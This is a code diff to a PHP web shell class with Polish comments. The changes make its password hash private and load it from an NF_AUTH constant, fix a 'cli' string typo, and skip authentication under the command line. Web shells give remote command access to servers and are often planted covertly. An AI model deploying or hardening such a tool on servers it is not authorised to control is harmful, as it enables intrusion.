@@ -42,12 +42,12 @@ class Shell
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
 	 *
-	 * format: sha1( $user . "\xff" . $pass );
+	 * format: sha1( $sUser . "\xff" . $sPass );
 	 *
-	 * @access public
+	 * @access private
 	 * @var    string
 	 */
-	public $sAuth;
+	private $sAuth;
 
 	/**
 	 * Czas generowania strony
@@ -247,6 +247,16 @@ class Shell
 	 */
 	public function __construct()
 	{
+		/**
+		 * Autoryzacja
+		 *
+		 * @see self::$sAuth
+		 */
+		if( defined( 'NF_AUTH' ) && preg_match( '~^[a-f0-9]{40}\z~', (string) NF_AUTH ) )
+		{
+			$this -> sAuth = NF_AUTH;
+		}
+
 		/**
 		 * @see Request::init
 		 *
@@ -1168,7 +1178,7 @@ DATA;
 			gethostbyaddr( $sIp ),
 			PHP_VERSION,
 			php_sapi_name(),
-			( ( PHP_SAPI === 'cli ') ? 'CLI' : Request::getCurrentUrl() ),
+			( ( PHP_SAPI === 'cli' ) ? 'CLI' : Request::getCurrentUrl() ),
 			Request::getServer( 'SCRIPT_FILENAME' ),
 			$this -> bSafeMode,
 			$this -> bExec,
@@ -1469,7 +1479,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 		/**
 		 * Uwierzytelnianie
 		 */
-		if( $this -> sAuth !== NULL )
+		if( ( PHP_SAPI !== 'cli' ) && ( $this -> sAuth !== NULL ) )
 		{
 			$sAuth = NULL;
 
